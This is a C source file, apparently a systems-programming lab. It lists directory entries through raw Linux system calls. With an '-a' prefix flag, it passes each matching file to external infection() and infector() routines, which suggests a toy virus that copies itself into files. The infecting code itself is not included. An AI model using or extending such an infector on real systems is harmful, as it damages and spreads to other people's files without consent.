
#include "util.h"
#include <dirent.h>

#define SYS_OPEN 5
#define SYS_CLOSE 6
#define SYS_WRITE 4
#define SYS_READ 3
#define STDIN 0
#define STDOUT 1
#define STDERR 2
#define exit 1
#define SYS_GETDENTS 141
extern void infection(int i);
extern void infector(char *);
extern void code_start();
extern void code_end();

 struct linux_dirent {
           unsigned long  d_ino;
           unsigned long  d_off;
           unsigned short d_reclen;
           char           d_name[];
};

void printNameAndType(char name[],char type){
    system_call(SYS_WRITE, STDOUT ,name, strlen(name));
    system_call(SYS_WRITE, STDOUT ,"\n", 1);
} 

int main(int argc, char **argv, char* envp[]) {
    int infect=0;
    int debug=0;
    int prefix=0;
    int i;
    for(i = 1 ; i < argc; i++){
        if(strncmp(argv[i],"-a",2) == 0){
                infect=i;
                prefix=i;
        }
        else 
            system_call(exit,0x55);
        }

    char buffer[8192];
    struct linux_dirent *dirent;
    char type;

    int dir= system_call(SYS_OPEN, ".", 0, 0777);
    
    long num = system_call(SYS_GETDENTS, dir, buffer, 8192);
    if(num == -1)
        system_call(exit,0x55);

    long pos = 0;
    while(pos < num){
        dirent = (struct linux_dirent*)(buffer+pos);
        type = *(buffer + pos + dirent->d_reclen -1);

        printNameAndType(dirent->d_name, type);
        if(infect>0 && ((dirent->d_name)[0] == argv[prefix][2]||argv[prefix][2]=='\0') ){
            infection(4);
            infector(dirent->d_name);
        }
        pos += dirent->d_reclen;
    }

    return 0;
}
   
    
   